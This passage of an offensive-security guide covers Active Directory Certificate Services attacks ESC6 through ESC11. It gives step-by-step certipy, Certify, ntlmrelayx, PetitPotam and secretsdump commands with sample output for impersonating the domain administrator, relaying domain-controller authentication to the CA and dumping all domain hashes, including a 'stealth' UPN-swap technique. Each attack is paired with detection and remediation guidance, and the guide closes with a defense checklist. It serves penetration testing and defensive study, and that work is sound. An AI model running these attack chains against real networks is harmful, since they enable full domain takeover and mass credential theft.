# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\Corp-CA\PolicyModules\
#   CertificateAuthority_MicrosoftDefault.Policy
# EditFlags REG_DWORD = 0x15014e (1376590)
#   EDITF_REQUESTEXTENSIONS -- 16 (0x10)
#   EDITF_DISABLEEXTENSIONLIST -- 32 (0x20)
#   EDITF_ADDOLDKEYUSAGE -- 64 (0x40)
#   EDITF_BASICCONSTRAINTSCRITICAL -- 256 (0x100)
#   EDITF_ENABLEAKIKEYID -- 1024 (0x400)
#   EDITF_ATTRIBUTEENDDATE -- 8192 (0x2000)
#   EDITF_ATTRIBUTESUBJECTALTNAME2 -- 262144 (0x40000)  ← HERE IT IS
```

#### Step 2: Find Any Enrollable Template with Auth EKU

```bash
# The default "User" template typically works — it has Client Authentication
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10\
  -stdout | grep -B 5 -A 30 "Template Name.*: User"

# Even though "Enrollee Supplies Subject: False" — the CA flag overrides this!
```

#### Step 3: Request Certificate with Arbitrary SAN

```bash
# Use the standard "User" template (or any template with Client Auth EKU)
# CA flag makes ANY template accept our SAN
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

```powershell
# Windows — Certify with /altname flag
.\Certify.exe request \
  /ca:ca01.corp.local\Corp-CA \
  /template:User \
  /altname:administrator

# Even though User template doesn't have EnrolleeSuppliesSubject,
# the CA flag overrides and accepts our requested SAN
```

#### Step 4: Authenticate and Escalate

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# → Hash for administrator

python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'
```

### Detection & Remediation

```bash
# Detection
# Check for flag presence (run regularly as scheduled task):
certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags | grep EDITF_ATTRIBUTESUBJECTALTNAME2

# Event ID 4899: Certificate Services changed configuration
# Monitor registry: HKLM\SYSTEM\...\CertSvc\Configuration\...\EditFlags

# Remediation — Remove the flag
certutil -config "ca01.corp.local\Corp-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart CertSvc
net stop certsvc && net start certsvc
# Or:
Restart-Service certsvc

# Verify it's gone
certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags
# EDITF_ATTRIBUTESUBJECTALTNAME2 should NOT appear
```

---

## ESC7 — Vulnerable CA ACL (ManageCA / ManageCertificates)

### Root Cause of Vulnerability

The CA object itself has an ACL controlling who can manage it. Two rights are particularly dangerous:

**`ManageCA`** (CA Administrator right):
- Can modify CA configuration
- Can enable `EDITF_ATTRIBUTESUBJECTALTNAME2` → ESC6
- Can add/remove CA managers and enrollment agents
- Can issue failed/pending requests

**`ManageCertificates`** (Certificate Manager right):
- Can approve or deny pending certificate requests
- This bypasses the "Manager Approval Required" control on templates
- An attacker with this right can approve their own malicious certificate requests

These rights are separate from OS-level admin rights and are controlled purely by the CA's own ACL, which is stored in AD.

### Step-by-Step Exploitation — ESC7-1 (ManageCA → ESC6)

#### Step 1: Identify ManageCA Rights

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout

# Look for:
#   CA Permissions
#     ManageCA              : CORP\lowpriv   ← Got it
#     ManageCertificates    : CORP\lowpriv
```

```powershell
# Check who has ManageCA using certutil
certutil -config "ca01.corp.local\Corp-CA" -getreg CA\SecurityDescriptor
# Or view in Certification Authority MMC:
# certsrv.msc → Corp-CA → Properties → Security
```

#### Step 2: Enable User-Specified SAN via ManageCA

```bash
# Certipy can directly enable the flag using ManageCA rights
certipy ca \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -enable-userspecifiedsan \
  -dc-ip 192.168.10.10

# [*] Successfully updated 'Corp-CA'
# Now EDITF_ATTRIBUTESUBJECTALTNAME2 is set → ESC6 applies
```

#### Step 3: Exploit as ESC6

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
```

### Step-by-Step Exploitation — ESC7-2 (ManageCertificates → Approve Own Request)

#### Step 1: Submit a Certificate Request Requiring Manager Approval

```bash
# Request cert for a template that requires manager approval
# Normally this would sit in a pending queue and never get approved
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'ApprovalRequiredTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

# Output:
# [*] Request ID is 47
# [*] Request is pending    ← Would normally die here
```

#### Step 2: Approve Your Own Request

```bash
# Using ManageCertificates right — approve request ID 47
certipy ca \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -issue-request 47 \
  -dc-ip 192.168.10.10

# [*] Successfully issued certificate
```

#### Step 3: Retrieve the Issued Certificate

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -retrieve 47 \
  -dc-ip 192.168.10.10

# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

#### Step 4: Authenticate

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# → Full domain compromise
```

### Detection & Remediation

```
Detection:
  Event ID 4896: One or more rows deleted from certificate database
  Event ID 4898: Certificate Services loaded a template
  Monitor CA permission changes in certsrv.msc
  Alert when ManageCA or ManageCertificates is granted to non-PKI accounts

Remediation:
  certsrv.msc → Corp-CA → Properties → Security
  Remove ManageCA and ManageCertificates from all non-PKI-admin accounts
  Only dedicated, highly-secured PKI admin accounts should have these rights
  Consider requiring multi-person authorization for CA management
```

---

## ESC8 — NTLM Relay to ADCS HTTP Enrollment

### Root Cause of Vulnerability

ADCS includes a **web enrollment interface** running on IIS at:
- `http://ca01.corp.local/certsrv/` (HTTP — completely vulnerable)
- `https://ca01.corp.local/certsrv/` (HTTPS — vulnerable if EPA not enabled)

This web interface accepts **NTLM authentication** to verify the requester's identity. NTLM authentication is fundamentally relayable — it's a challenge-response protocol where the victim's credentials can be forwarded to another server.

The attack chain:
1. Attacker sets up an NTLM relay listener
2. Attacker **coerces** a high-value target (e.g., DC01 at 192.168.10.10) to authenticate to the attacker
3. Attacker relays that authentication to `http://ca01.corp.local/certsrv/`
4. CA server sees the request as coming from DC01$ (domain computer account)
5. Attacker requests a certificate for DC01$ machine account
6. DC01$ machine account certificate → PKINIT TGT as DC01$ → DCSync

**Why machine accounts matter:** Domain Controller machine accounts have `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` privileges — they can DCSync and dump all domain credentials.

### Step-by-Step Exploitation

#### Step 1: Verify Web Enrollment is Running

```bash
# Check if certsrv is accessible
curl -v http://ca01.corp.local/certsrv/ 2>&1 | head -30

# Look for:
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Negotiate
# WWW-Authenticate: NTLM    ← NTLM is accepted!

# Certipy will also show this:
certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10
# Web Enrollment: Enabled
# Request Disposition: Issue
```

#### Step 2: Start NTLM Relay Targeting ADCS

```bash
# On Kali (192.168.10.99)
# Make sure port 445 is free (stop any local SMB)
sudo systemctl stop smbd nmbd

# Start relay targeting ADCS web enrollment
# --adcs flag extracts certificate from the relay response
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController' \
  -debug

# Output:
# [*] Protocol Client HTTPS loaded..
# [*] Protocol Client HTTP loaded..
# [*] Protocol Client SMB loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server
# [*] Setting up HTTP Server
# [*] Servers started, waiting for connections
```

#### Step 3: Coerce DC Authentication (PetitPotam)

```bash
# Open a second terminal on Kali
# PetitPotam — triggers EFSRPC authentication from DC01 to our listener
python3 /opt/PetitPotam/PetitPotam.py \
  -u '' \
  -p '' \
  192.168.10.99 \
  192.168.10.10

# Output:
# Trying pipe lsarpc
# [+] Triggering authentication via EfsRpcOpenFileRaw (opnum 0)
# [+] Got authentication from 192.168.10.10
```

```bash
# Alternative: PrinterBug (MS-RPRN Spooler)
python3 printerbug.py \
  'corp.local/lowpriv:Password123!@192.168.10.10' \
  192.168.10.99
```

```bash
# Alternative: Coercer (tries all methods)
coercer coerce \
  -u lowpriv \
  -p 'Password123!' \
  -d corp.local \
  -l 192.168.10.99 \
  -t 192.168.10.10
```

#### Step 4: Capture the Certificate

```bash
# Back in the ntlmrelayx terminal, you should see:
# [*] SMBD-Thread-3: Incoming connection (192.168.10.10, 50234)
# [*] Authenticating against http://ca01.corp.local/certsrv/certfnsh.asp as CORP/DC01$
# [*] HTTPD(80): Connection from CORP/DC01$ authenticated
# [*] Generating CSR for DC01$...
# [*] Successfully requested certificate
# [*] DC01$ certificate:
#     MIIFsz ... [base64]
# [*] Saved certificate to: DC01$.pfx
```

#### Step 5: Authenticate as Domain Controller

```bash
# Use DC01's certificate for PKINIT
certipy auth \
  -pfx 'DC01$.pfx' \
  -dc-ip 192.168.10.10 \
  -username 'DC01$' \
  -domain corp.local

# Output:
# [*] Using principal: DC01$@corp.local
# [*] Got TGT
# [*] Saved credential cache to 'DC01$.ccache'
# [*] Got hash for 'DC01$@corp.local': aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
```

#### Step 6: DCSync Using DC Machine Account

```bash
export KRB5CCNAME=DC01\$.ccache

# Use DC account to DCSync all hashes
python3 secretsdump.py \
  -k \
  -no-pass \
  -just-dc \
  dc01.corp.local

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
# [... all domain users ...]

# Or use Pass-the-Hash
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
  'corp.local/DC01$@192.168.10.10'
```

### Detection & Remediation

```bash
# Detection
# IIS logs on CA01 — look for machine accounts (ending in $) authenticating to certsrv
# Event ID 4768 on DC01 — TGT requests using PKINIT from machine accounts
# Unusual certificate enrollment for machine accounts (Event 4887)

# Remediation

# Option 1: Enable HTTPS + Extended Protection for Authentication (EPA)
# On CA01 IIS:
Import-Module WebAdministration
Set-WebConfigurationProperty `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name extendedProtection.tokenChecking `
  -PSPath "IIS:\Sites\Default Web Site\certsrv" `
  -Value "Require"

# Option 2: Disable HTTP enrollment, force HTTPS only
# IIS Manager → Default Web Site → certsrv → Bindings → Remove HTTP

# Option 3: Enable SMB signing on all machines (blocks relay)
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
#   Local Policies → Security Options → Microsoft network server: Digitally sign communications (always) = Enabled

# Option 4: Patch PetitPotam (disable EFS on servers that don't need it)
# KB5005413 (for Windows Server 2019/2022)
Set-Service -Name EFS -StartupType Disabled
Stop-Service EFS
```

---

## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

### Root Cause of Vulnerability

Starting with Windows Server 2022 (and via KB5014754 for older systems), Microsoft added a new extension to certificates: `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`).

This extension embeds the **SID of the user who requested the certificate** into the certificate itself. When a DC validates a certificate for authentication, it can verify: "Is the SID in this certificate's extension the same as the user account we're mapping it to?"

The flag `CT_FLAG_NO_SECURITY_EXTENSION` (value `0x80000`) in `msPKI-Enrollment-Flag` tells the CA: **"Do NOT embed the SID extension in certificates from this template."**

Without the SID extension, the DC falls back to mapping certificates to accounts based only on the **UPN in the SAN**. This creates a window for exploitation:

If an attacker has `GenericWrite` or `WriteProperty` on a user object (victimuser), they can:
1. Change victimuser's UPN to match a target user (e.g., administrator)
2. Request a certificate as victimuser (gets issued with "administrator" UPN, no SID binding)
3. Restore victimuser's UPN
4. Use the certificate to authenticate as administrator (DC matches UPN only)

### Step-by-Step Exploitation

#### Step 1: Find Template with No Security Extension

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for:
#   No Security Extension  : True
#   Enrollee Supplies Subject: False   ← This is normally "safe" — but not here
#   Client Authentication  : True
#   Enrollment Rights      : Domain Users
```

#### Step 2: Verify Write Access on Victim User Object

```bash
# Check if lowpriv has GenericWrite on victimuser
python3 dacledit.py \
  -action read \
  -target 'victimuser' \
  -dc-ip 192.168.10.10 \
  'corp.local/lowpriv:Password123!'

# Look for GenericWrite or WriteProperty (User-Account-Restrictions)
```

```powershell
# PowerView
Get-DomainObjectAcl -Identity victimuser -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -like "*lowpriv*" }
```

#### Step 3: Check Current UPN of Both Users

```bash
# Get current UPN of victimuser (we need to restore it later)
python3 ldapdomaindump.py \
  -u 'corp\lowpriv' \
  -p 'Password123!' \
  192.168.10.10

# Or:
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -dc-ip 192.168.10.10
# Check current UPN: victimuser@corp.local
```

#### Step 4: Change Victim's UPN to Target

```bash
# Change victimuser's UPN to "administrator" (just the username, no domain part)
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -upn administrator \
  -dc-ip 192.168.10.10

# [*] Updating user 'victimuser'
# [*] Successfully updated 'victimuser'
# victimuser's UPN is now: administrator (no @domain)
```

#### Step 5: Request Certificate AS Victim User

```bash
# Request cert as victimuser — CA will embed "administrator" UPN (no SID!)
certipy req \
  -u victimuser@corp.local \
  -p 'Summer2024!' \
  -ca 'Corp-CA' \
  -template 'NoSecExtTemplate' \
  -dc-ip 192.168.10.10

# [*] Got certificate with UPN 'administrator'
# [*] Certificate has no object SID  ← Key indicator
# [*] Saved certificate and private key to 'victimuser.pfx'
```

#### Step 6: Immediately Restore Victim's UPN (Stealth!)

```bash
# Restore victimuser's original UPN ASAP
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -upn victimuser@corp.local \
  -dc-ip 192.168.10.10

# [*] Successfully updated 'victimuser'
# victimuser's UPN is back to normal — change window was only seconds
```

#### Step 7: Authenticate as Administrator

```bash
certipy auth \
  -pfx victimuser.pfx \
  -domain corp.local \
  -dc-ip 192.168.10.10

# DC behavior (StrongCertificateBindingEnforcement not enforced):
# → Cert has UPN "administrator" (no SID extension)
# → Maps to administrator@corp.local by UPN
# → Issues TGT as administrator
# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

### Detection & Remediation

```powershell
# Detection
# Event ID 4738 (User Account Changed) — watch for UPN changes
# Correlate: UPN change on account → certificate enrollment by that account → UPN restored
# Alert on certificates issued without the szOID_NTDS_CA_SECURITY_EXT extension

# Remediation
# 1. Remove CT_FLAG_NO_SECURITY_EXTENSION from templates
#    certtmpl.msc → Template → Extensions → verify security extension is not suppressed

# 2. Enable Strong Certificate Binding Enforcement on ALL DCs
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
  -Name StrongCertificateBindingEnforcement -Value 2
# 0 = disabled, 1 = compat mode (still vulnerable!), 2 = full enforcement

# 3. Restrict who can modify UPN attributes (use fine-grained permissions)
```

---

## ESC10 — Weak Certificate Mappings (DC Registry Settings)

### Root Cause of Vulnerability

Following the "Certified Pre-Owned" research, Microsoft issued **KB5014754** introducing stronger certificate-to-account mapping. The mapping behavior is controlled by DC registry keys:

**Key 1:** `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`
- `0` = Disabled — DC only checks UPN, completely ignores SID. **Fully vulnerable.**
- `1` = Compat mode — DC checks SID if present, falls back to UPN if not. **Still exploitable for certs without SID extension (ESC9).**
- `2` = Full enforcement — Cert MUST have SID extension matching the account. **Secure.**

**Key 2:** `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods`
Controls which mapping methods are allowed for SCHANNEL (non-Kerberos TLS auth):
- Bit `0x4` = UPN mapping (weak)
- Bit `0x8` = S4U2Self / subject name mapping

When `CertificateMappingMethods` includes `0x4` and an attacker can modify a user's UPN, they can authenticate via SCHANNEL using a spoofed UPN certificate.

### Step-by-Step Exploitation — ESC10-1

#### Step 1: Confirm Weak Enforcement on DC

```powershell
# Check DC01 registry
Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
  Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" | 
    Select StrongCertificateBindingEnforcement
}
# Value: 0 or 1 = vulnerable

# Or via Certipy
certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10
# Check output for enforcement mode warnings
```

#### Step 2: Exploitation Chain (Same as ESC9)

```bash
# With StrongCertificateBindingEnforcement = 0 or 1, ANY cert with spoofed UPN works
# Even templates that DO have the security extension but enforcement is disabled

# Change victim UPN to administrator
certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser -upn administrator@corp.local \
  -dc-ip 192.168.10.10

# Request cert via any valid template
certipy req \
  -u victimuser@corp.local -p 'Summer2024!' \
  -ca 'Corp-CA' -template 'User' \
  -dc-ip 192.168.10.10

# Restore UPN
certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser -upn victimuser@corp.local \
  -dc-ip 192.168.10.10

# Authenticate — enforcement is off so DC doesn't check SID
certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.10.10
```

### Step-by-Step Exploitation — ESC10-2 (CertificateMappingMethods)

```bash
# If UPN mapping (0x4) is enabled in CertificateMappingMethods
# AND attacker can change victim's altSecurityIdentities attribute

# Check current setting
Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel").CertificateMappingMethods
  "Value: $val"
  if ($val -band 0x4) { "UPN Mapping: ENABLED (Vulnerable)" }
  else { "UPN Mapping: Disabled (Safe)" }
}
```

### Detection & Remediation

```powershell
# Remediation — Apply to ALL Domain Controllers
$dcs = (Get-ADDomainController -Filter *).Name
foreach ($dc in $dcs) {
  Invoke-Command -ComputerName $dc -ScriptBlock {
    # Enable full strong binding enforcement
    Set-ItemProperty `
      -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
      -Name StrongCertificateBindingEnforcement `
      -Value 2 `
      -Type DWord

    # Restrict SCHANNEL cert mapping (remove UPN mapping bit)
    $current = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel").CertificateMappingMethods
    $new = $current -band (-bnot 0x4)  # Remove UPN mapping bit
    Set-ItemProperty `
      -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" `
      -Name CertificateMappingMethods `
      -Value $new

    Write-Host "Updated $env:COMPUTERNAME"
  }
}
```

---

## ESC11 — IF_ENFORCEENCRYPTICERTREQUEST Disabled

### Root Cause of Vulnerability

The certificate enrollment RPC interface (`ICertRequest`) is **always running** on any ADCS server — it's the primary interface used by Windows for certificate enrollment and doesn't require web enrollment to be enabled.

The CA flag `IF_ENFORCEENCRYPTICERTREQUEST` (bit `0x00000200`) controls whether the CA requires **encrypted (authenticated) RPC connections** for certificate requests.

When this flag is **not set** (default in many deployments), the CA accepts **cleartext/unauthenticated RPC connections** for enrollment. This means NTLM relay attacks against the RPC endpoint become possible.

**The critical difference from ESC8:**
- ESC8 targets HTTP → requires web enrollment to be installed and running
- ESC11 targets RPC → **always available** as long as ADCS is installed

Attack chain is identical to ESC8 but targets port 135/RPC instead of port 80/443.

### Step-by-Step Exploitation

#### Step 1: Check if Flag is Missing

```bash
# Certipy detection
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10

# Look for:
#   Enforce Encryption for Requests : Disabled   ← VULNERABLE

# Manual check via certutil on CA01
certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags
# IF_ENFORCEENCRYPTICERTREQUEST -- 512 (0x200) should appear if SAFE
# If not listed → vulnerable
```

#### Step 2: Set Up NTLM Relay to RPC Enrollment

```bash
# On Kali (192.168.10.99)
# ntlmrelayx now supports ICPR (ICertRequest RPC) mode
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t rpc://ca01.corp.local \
  -rpc-mode ICPR \
  --adcs \
  --template 'DomainController' \
  -smb2support \
  -debug

# Output:
# [*] Setting up RPC relay to rpc://ca01.corp.local
# [*] Setting up SMB Server on port 445
# [*] Servers started, waiting for connections
```

#### Step 3: Coerce DC Authentication

```bash
# PetitPotam — coerce DC01 to authenticate to our listener
python3 /opt/PetitPotam/PetitPotam.py \
  192.168.10.99 \
  192.168.10.10

# Or Coercer
coercer coerce \
  -u lowpriv -p 'Password123!' -d corp.local \
  -l 192.168.10.99 \
  -t 192.168.10.10
```

#### Step 4: Certificate Captured via RPC Relay

```bash
# ntlmrelayx output after successful relay:
# [*] SMBD-Thread-5: Incoming connection (192.168.10.10, 49812)
# [*] Authenticating against rpc://ca01.corp.local as CORP/DC01$
# [*] Connecting to RPC: ca01.corp.local:135
# [*] Connecting to endpoint: \PIPE\cert
# [*] Requesting certificate for DC01$...
# [*] Got certificate! Saved to DC01$.pfx
```

#### Step 5: Authenticate and DCSync

```bash
# Authenticate as DC01$
certipy auth \
  -pfx 'DC01$.pfx' \
  -dc-ip 192.168.10.10 \
  -username 'DC01$' \
  -domain corp.local

# [*] Got hash for 'DC01$@corp.local': aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2

# DCSync
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
  'corp.local/DC01$@192.168.10.10'

# Full domain dump complete.
```

### Comparing ESC8 vs ESC11

| | ESC8 | ESC11 |
|--|------|-------|
| **Target interface** | HTTP/HTTPS `/certsrv/` | RPC `ICertRequest` |
| **Port** | 80 or 443 | 135 (+ dynamic) |
| **Requires web enrollment** | Yes | No — always on |
| **Tool relay flag** | `--adcs` | `--adcs -rpc-mode ICPR` |
| **Mitigation** | HTTPS + EPA on IIS | `IF_ENFORCEENCRYPTICERTREQUEST` flag |
| **Prevalence** | Medium | High (flag often unset by default) |

### Detection & Remediation

```bash
# Remediation — Enable encrypted RPC enforcement
certutil \
  -config "ca01.corp.local\Corp-CA" \
  -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST

# Restart Certificate Services
net stop certsvc && net start certsvc

# Verify
certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags
# Should now show: IF_ENFORCEENCRYPTICERTREQUEST -- 512 (0x200)
```

```powershell
# Additional defense — Enable SMB signing (blocks relay prerequisite)
# Group Policy: Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → Security Options:
#   "Microsoft network client: Digitally sign communications (always)" = Enabled
#   "Microsoft network server: Digitally sign communications (always)" = Enabled

# Enforce via PowerShell on all hosts
$policy = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
  "SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters", $true)
$policy.SetValue("RequireSecuritySignature", 1, [Microsoft.Win32.RegistryValueKind]::DWord)
```

---

## Complete ESC Cheat Sheet

```
╔════╦═══════════════════════════════╦══════════════╦══════════════════════╦════════════╗
║ ESC║ Name                          ║ Where        ║ Min Requirement      ║ Impact     ║
╠════╬═══════════════════════════════╬══════════════╬══════════════════════╬════════════╣
║  1 ║ SAN Abuse                     ║ Template     ║ Enroll + ESS flag    ║ DA         ║
║  2 ║ Any Purpose EKU               ║ Template     ║ Enroll + Any EKU     ║ DA         ║
║  3 ║ Enrollment Agent              ║ Template×2   ║ Enroll + CEP EKU     ║ DA         ║
║  4 ║ Writable Template ACL         ║ AD Object    ║ Write on template    ║ DA         ║
║  5 ║ Writable PKI Object           ║ AD Object    ║ Write on NTAuth/CA   ║ PKI        ║
║  6 ║ EDITF SAN Flag                ║ CA Config    ║ Any enrollable tpl   ║ DA         ║
║  7 ║ CA ManageCA/ManageCerts       ║ CA ACL       ║ CA manage rights     ║ DA         ║
║  8 ║ HTTP NTLM Relay               ║ IIS/HTTP     ║ Web enroll+coercion  ║ DA         ║
║  9 ║ No SID Extension              ║ Template+UPN ║ Write UPN + weak map ║ DA         ║
║ 10 ║ Weak DC Mapping               ║ DC Registry  ║ Write UPN + DC weak  ║ DA         ║
║ 11 ║ RPC NTLM Relay                ║ CA RPC       ║ NTLM relay+coercion  ║ DA         ║
╚════╩═══════════════════════════════╩══════════════╩══════════════════════╩════════════╝

DA = Domain Admin level compromise
PKI = Full PKI infrastructure compromise (worse than DA — persistent)
```

---

## Quick Enumeration Commands Reference

```bash
# ══ Full automated scan ══
certipy find -u lowpriv@corp.local -p 'Password123!' \
  -dc-ip 192.168.10.10 -vulnerable -stdout

# ══ Save to JSON for analysis ══
certipy find -u lowpriv@corp.local -p 'Password123!' \
  -dc-ip 192.168.10.10 -json -output adcs_enum

# ══ BloodHound output ══
certipy find -u lowpriv@corp.local -p 'Password123!' \
  -dc-ip 192.168.10.10 -bloodhound

# ══ Windows Certify ══
.\Certify.exe find /vulnerable /showAllPermissions

# ══ Check specific CA flags ══
certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags
certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags

# ══ List all templates ══
certutil -catemplates
```

---

## Defense Checklist

```
[ ] Run certipy/PSPKIAudit — fix ALL findings
[ ] Remove EnrolleeSuppliesSubject from non-web-server templates
[ ] Specify explicit minimal EKUs on all templates
[ ] Set StrongCertificateBindingEnforcement = 2 on ALL DCs
[ ] Enable IF_ENFORCEENCRYPTICERTREQUEST on all CAs
[ ] Remove EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag
[ ] Audit ManageCA / ManageCertificates — PKI admins only
[ ] Enable HTTPS + EPA on web enrollment (or disable it)
[ ] Enable SMB signing everywhere (blocks relay prerequisite)
[ ] Audit template ACLs — only EA/DA should write
[ ] Audit NTAuthCertificates contents quarterly
[ ] Monitor Event IDs: 4886, 4887, 4888, 4896, 4897, 4898, 5136, 4738, 4768
[ ] Disable unused templates
[ ] Separate PKI admin accounts from regular admin accounts
[ ] Patch PetitPotam / disable unnecessary EFSRPC
```

---

## References

1. **Certified Pre-Owned** (SpecterOps, 2021) — https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
2. **Certipy** (Oliver Lyak) — https://github.com/ly4k/Certipy
3. **Certipy ESC9/ESC10 Research** — https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-new-authentication-and-request-methods-and-more-7237d88061f7
4. **ESC11 Research** (Compass Security) — https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/
5. **Microsoft KB5014754** — https://support.microsoft.com/kb/5014754
6. **PetitPotam** — https://github.com/topotam/PetitPotam
7. **GhostPack/Certify** — https://github.com/GhostPack/Certify
8. **GhostPack/Rubeus** — https://github.com/GhostPack/Rubeus
9. **PSPKIAudit** — https://github.com/GhostPack/PSPKIAudit
10. **BloodHound ADCS Paths** — https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf

---

*For authorized security testing and educational purposes only.*
